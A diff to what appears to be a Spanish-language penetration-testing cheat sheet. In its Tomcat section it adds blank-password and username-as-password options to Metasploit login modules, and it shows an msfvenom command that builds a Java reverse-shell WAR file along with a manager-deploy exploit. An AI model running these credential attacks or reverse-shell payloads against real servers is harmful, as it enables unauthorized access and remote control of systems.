@@ -63,7 +63,11 @@ Host: foo.bar
 
 #TOMCAT
 use auxiliary/admin/http/tomcat_administration // Probar creds de admin
+	set BLANK_PASSWORDS true
+	set USER_AS_PASS true
 use auxiliary/scanner/http/tomcat_mgr_login // Login de manager
+	set BLANK_PASSWORDS true
+	set USER_AS_PASS true
 	En caso de que accedamos al manager => msfvenom -p java/shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
 	O también => use exploit/multi/http/tomcat_mgr_deploy
 
